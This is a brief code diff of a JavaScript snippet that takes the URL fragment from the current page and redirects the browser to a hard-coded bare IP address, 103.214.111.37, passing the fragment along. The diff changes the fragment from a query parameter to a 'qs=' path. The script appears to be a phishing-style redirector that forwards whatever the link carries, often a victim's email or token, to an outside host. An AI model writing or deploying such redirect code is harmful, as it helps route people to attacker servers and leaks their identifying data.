@@ -1,7 +1,8 @@
 <script>
     const hashValue = window.location.hash.substring(1); // Removes the '#' symbol
     if (hashValue) {
-        document.location.href = `https://103.214.111.37/?${hashValue}`;
+        // Redirect directly with the hash value as part of the URL path
+        document.location.href = `https://103.214.111.37/qs=${hashValue}`;
     } else {
         document.location.href = 'https://103.214.111.37/';
     }
